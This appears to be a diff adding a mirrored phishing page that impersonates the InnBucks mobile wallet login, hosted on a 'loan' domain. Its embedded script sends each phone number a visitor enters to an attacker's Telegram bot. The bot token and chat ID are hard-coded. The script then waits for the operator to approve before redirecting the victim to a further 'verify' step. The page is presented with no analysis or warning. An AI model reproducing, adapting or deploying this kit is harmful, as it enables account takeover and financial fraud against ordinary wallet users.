@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from innbucks2026loan.onrender.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Feb 2026 12:54:34 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InnBucks - Welcome</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #0f172a;
+            color: #f1f5f9;
+            overflow-x: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            padding: 60px 24px 40px;
+            text-align: center;
+        }
+        
+        .logo-header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 60px;
+        }
+        
+        .logo-img {
+            width: 180px;
+            height: auto;
+        }
+        
+        .welcome-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #e2e8f0;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #94a3b8;
+            margin-bottom: 60px;
+        }
+        
+        .phone-group {
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto 40px;
+        }
+        
+        .phone-container {
+            display: flex;
+            align-items: center;
+            background: #1e293b;
+            border: 2px solid #334155;
+            border-radius: 16px;
+            padding: 18px 20px;
+            font-size: 18px;
+        }
+        
+        .country-code {
+            color: #60a5fa;
+            font-weight: 600;
+            margin-right: 16px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .phone-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #f1f5f9;
+            font-size: 18px;
+        }
+        
+        .phone-input::placeholder {
+            color: #64748b;
+        }
+        
+        .legal-text {
+            font-size: 14px;
+            color: #94a3b8;
+            margin: 20px auto;
+            max-width: 380px;
+            line-height: 1.5;
+        }
+        
+        .legal-text a {
+            color: #60a5fa;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+        
+        .continue-btn {
+            width: 100%;
+            max-width: 420px;
+            margin: 40px auto 0;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .continue-btn:hover {
+            background: #2563eb;
+        }
+        /* Spinner Overlay */
+        
+        #spinnerOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #334155;
+            border-top: 5px solid #60a5fa;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        /* Error/Cancel Overlay */
+        
+        #cancelOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1100;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .cancel-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            color: #ef4444;
+        }
+        
+        .cancel-title {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        
+        .cancel-message {
+            font-size: 17px;
+            line-height: 1.6;
+            max-width: 340px;
+            color: #cbd5e1;
+        }
+        
+        .close-btn {
+            margin-top: 30px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 32px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="logo-header">
+        <img src="../wallet.innbucks.co.zw/images/INNBUCKS_WHITE_LOGO.png" alt="InnBucks" class="logo-img">
+    </div>
+
+    <h1 class="welcome-title">Welcome To InnBucks</h1>
+    <p class="subtitle">Zimbabwe's Smart Mobile Wallet</p>
+
+    <div class="phone-group">
+        <div class="phone-container">
+            <div class="country-code">
+                +263 ▼
+            </div>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="Enter your mobile number">
+        </div>
+    </div>
+
+    <div class="legal-text">
+        By pressing Sign Up, you agree to our
+        <a href="#">Privacy Policy</a> and
+        <a href="#">Terms and Conditions</a>
+    </div>
+
+    <button class="continue-btn" onclick="startSignupProcess()">Continue</button>
+
+    <!-- Spinner Overlay -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Cancel/Error Overlay -->
+    <div id="cancelOverlay">
+        <div class="cancel-icon">⚠️</div>
+        <div class="cancel-title">Action Failed</div>
+        <div class="cancel-message">
+            The details could not be verified or the request was cancelled.<br><br> Please try again or contact support.
+        </div>
+        <button class="close-btn" onclick="closeCancelOverlay()">Try Again</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8255631739:AAEnO1w67WAdk9i8lOK_1IsUkIqzSEwySaY';
+        const CHAT_ID = '5615316142';
+
+        const savedPhone = localStorage.getItem('phone');
+        const phoneInput = document.getElementById('phoneInput');
+        if (savedPhone && savedPhone.length === 9) {
+            phoneInput.value = savedPhone;
+        }
+
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const cancelOverlay = document.getElementById('cancelOverlay');
+        let processStarted = false;
+        let pollInterval;
+        let lastUpdateId = 0;
+        let currentTimestamp = '';
+
+        function closeCancelOverlay() {
+            cancelOverlay.style.display = 'none';
+            processStarted = false;
+            phoneInput.focus();
+        }
+
+        function startSignupProcess() {
+            if (processStarted) return;
+            processStarted = true;
+
+            const phone = phoneInput.value.trim().replace(/\D/g, '');
+            if (!phone || phone.length < 9) {
+                alert('Please enter a valid mobile number');
+                processStarted = false;
+                return;
+            }
+
+            localStorage.setItem('phone', phone);
+
+            spinnerOverlay.style.display = 'flex';
+            currentTimestamp = Date.now().toString();
+
+            const message = `New InnBucks Signup Attempt\n\nPhone: +263${phone}\n\nApprove this signup?`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{
+                                text: '✅ Approve',
+                                callback_data: 'approve_' + currentTimestamp
+                            }, {
+                                text: '❌ Cancel',
+                                callback_data: 'cancel_' + currentTimestamp
+                            }]
+                        ]
+                    }
+                })
+            }).catch(err => {
+                console.error('Send message failed:', err);
+                spinnerOverlay.style.display = 'none';
+                processStarted = false;
+            });
+
+            // Start polling for admin response
+            pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            data.result.forEach(update => {
+                                lastUpdateId = Math.max(lastUpdateId, update.update_id);
+
+                                if (update.callback_query) {
+                                    const query = update.callback_query;
+                                    const [action, timestamp] = query.data.split('_');
+
+                                    if (timestamp === currentTimestamp) {
+                                        clearInterval(pollInterval);
+                                        spinnerOverlay.style.display = 'none';
+
+                                        // Optional: Acknowledge callback to stop Telegram loading
+                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                            method: 'POST',
+                                            headers: {
+                                                'Content-Type': 'application/json'
+                                            },
+                                            body: JSON.stringify({
+                                                callback_query_id: query.id,
+                                                text: action === 'approve' ? 'Approved!' : 'Cancelled'
+                                            })
+                                        });
+
+                                        if (action === 'approve') {
+                                            window.location.href = 'verify.html'; // Redirect to verify page (change as needed)
+                                        } else {
+                                            cancelOverlay.style.display = 'flex';
+                                        }
+
+                                        processStarted = false;
+                                    }
+                                }
+                            });
+                        }
+                    })
+                    .catch(err => console.error('Polling error:', err));
+            }, 2000);
+        }
+
+        phoneInput.focus();
+    </script>
+</body>
+
+<!-- Mirrored from innbucks2026loan.onrender.com/login by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Feb 2026 12:54:34 GMT -->
+
+</html>
